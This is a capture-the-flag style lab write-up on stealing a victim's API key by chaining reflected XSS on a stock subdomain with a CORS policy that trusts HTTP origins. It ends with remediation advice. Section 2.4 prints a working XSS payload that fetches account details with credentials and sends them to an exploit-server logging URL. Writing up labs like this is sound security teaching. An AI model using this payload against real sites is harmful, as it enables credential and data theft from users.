# Lab: Data Exfiltration via CORS Trusting Insecure Protocols

**Severity:** High 

**Vulnerability Type:** CORS Misconfiguration/Reflected Cross-Site Scripting (XSS)

**Target:** Web Security Academy Shop - Product Stock Subdomain 

##### 1. Executive Summary 

A security assessment of the "We Like to Shop" application identified a 
critical flaw in how the application handles Cross-Origin Resource Sharing 
(CORS).

The main application allows access from specific subdomains (whitelisted origins).
However, it insecurely trusts these subdomains even over unencrypted HTTP.
Additionally, the whitelisted `stock` subdomain was found to contain a 
Reflected Cross-Site Scripting (XSS) vulnerability. By chaining these two 
issues, an attacker can construct a malicious URL on the trusted subdomain
that executes JavaScript. This script, running from a "trusted" origin, allows
the attacker to query the main application's API and exfiltrate sensitive 
user data (API keys). 

##### 2. Technical Walkthrough 

2.1 Reconnaissance & Traffic Analysis

The assessment began by analysing the "Check Stock" functionality. It was
observed that this feature opens a new window pointing to a subdomain 
(`stock.YOUR-LAB-ID...`) over an insecure HTTP connection. 

<img width="1187" height="746" alt="cc2" src="https://github.com/user-attachments/assets/beca3d47-ea10-47b3-8dec-939039946b55" />
<img width="992" height="739" alt="cc3" src="https://github.com/user-attachments/assets/be0c1958-9b28-40f3-8de6-bf9d0a136419" />

2.2 Vulnerability 1: Reflected XSS on Subdomain 

Further analysis of the stock subdomain revealed a Reflected XSS vulnerability. 
The `productId` parameter is reflected into the error message without 
sanitisation. 

A proof-of-concept payload was sent to verify execution: `GET /?productId=<script>alert(1)</script>&storeId=1`

<img width="1440" height="877" alt="cc4" src="https://github.com/user-attachments/assets/ac23249f-21ac-47e8-8dda-4908ad3b8a24" />

2.3 Vulnerability 2: Insecure CORS Trust

The main application (`https:YOUR-LAB-ID...`) implements a CORS policy that
allows requests from the `stock` subdomain. Crucially, it does not enforce
the protocol, meaning `http://stock...` is trusted just as `https://stock...`
would be. 

2.4 Exploitation Chain

To steal the victim's API key, we constructed an attack chain:

1. Craft Malicious Payload: Write JavaScript that fetches `/accountDetails`
from the main site (sending credentials) and exfiltrates the response to the
attacker's server.

2. Inject into Trusted Origin: Encode this JavaScript and inject it into the
XSS vulnerability on the `stock` subdomain.

3. Bypass CORS: Because the XSS payload executes on `stock.web-security-
academy.net`, the browser treats the request to the main site as coming from
a trusted origin. The main site permits the request and returns the data.

The Final Malicious URL:

```
http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
   location='https://exploit-server.net/log?key='+this.responseText;
};
</script>&storeId=1
```

2.5 Execution 

When the victim clicked the malicious link pointing to the stock 
subdomain, the XSS triggered, the script executed, and the API key was sent
to the attacker's logger.

<img width="1185" height="731" alt="cc5" src="https://github.com/user-attachments/assets/b550773a-4015-4650-9a55-02a92cc13a4b" />
<img width="1186" height="743" alt="cc6" src="https://github.com/user-attachments/assets/54043368-44bb-4a21-ad8d-3c60abc5c20d" />

##### 3. Impact Analysis

The impact is rated as High. 

- Bypassing Security Controls: This demonstrates that even if the main site
is secure (HTTPS), trusting insecure (HTTP) subdomains creates a weak link.

- Data Theft: Attackers can read PII, payment history, or API keys by
pivoting through the vulnerable subdomain.

##### 4. Remediation

To mitigate this vulnerability:

1. Enforce HTTPS in CORS: The CORS whitelist should explictly require
`https://`. Never trust `http://` origins in a secure environment.

2. Fix XSS: Sanitise and encode the `productId` parameter on the stock
subdomain to prevent script injection.

3. Strict Whitelisting: Regularly audit whitelisted domains to ensure they
adhere to the same security standards as the main application. 
